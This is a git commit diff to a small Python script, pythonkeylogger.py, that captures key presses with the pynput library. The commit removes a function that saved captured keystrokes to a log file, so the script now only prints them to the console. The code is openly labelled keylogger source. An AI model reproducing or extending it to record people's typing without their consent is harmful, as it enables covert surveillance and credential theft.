6f02e22db44c5cacd7e64c7d04ef5d210e1ea47e
Nidhin Xavier <132472527+NDX7@users.noreply.github.com>
2024-04-10 20:08:14 +0530

    Update pythonkeylogger.py

--- pythonkeylogger.py
+++ pythonkeylogger.py
@@ -1,4 +1,4 @@
-#  using pynput module
+# keylogger using pynput module
 
 import pynput
 from pynput.keyboard import Key, Listener
@@ -8,26 +8,15 @@ keys = []
 def on_press(key):
 	
 	keys.append(key)
-	write_file(keys)
+
 	
 	try:
-		print('alphanumeric key {0} pressed'.format(key.char))
+		print('alphanumeric key {0} pressed'.format(key.char,))
 		
 	except AttributeError:
 		print('special key {0} pressed'.format(key))
 		
-def write_file(keys):
-	
-	with open('logf.txt', 'w') as f:
-		for key in keys:
-			
-			# removing ''
-			k = str(key).replace("'", "")
-			f.write(k)
-					
-			# explicitly adding a space after 
-			# every keystroke for readability
-			f.write(' ') 
+
 			
 def on_release(key):
 					
@@ -35,7 +24,6 @@ def on_release(key):
 	if key == Key.esc:
 		# Stop listener
 		return False
-
 
 with Listener(on_press = on_press,
 			on_release = on_release) as listener:
